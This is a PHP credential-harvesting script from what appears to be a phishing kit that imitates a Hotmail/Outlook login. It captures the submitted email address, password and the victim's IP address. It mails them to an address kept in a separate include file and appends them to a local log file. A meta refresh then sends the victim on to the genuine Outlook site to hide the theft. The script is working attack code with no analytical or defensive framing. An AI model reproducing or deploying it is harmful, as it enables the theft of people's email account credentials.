<meta http-equiv="Refresh"
content="0;url=https://outlook.live.com/owa/"> 
<?php  
include "348563653564375435.php";
$emailx = $_POST['uz3r'];  
$passx = $_POST['p4zz'];  
$IP = getenv("REMOTE_ADDR");  
$BILSMG = "   
m4il :  $emailx
pazz : $passx
ip : $IP  
==========================";  
$MAIL_TITLE = "H0tm4il | ".$IP."";  
$MAIL_HEADER = "From: C4pturaz";  
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);  
$handle = fopen("C4ps.txt", "a");  
fwrite($handle,$BILSMG);  
$x=md5(microtime());  



?>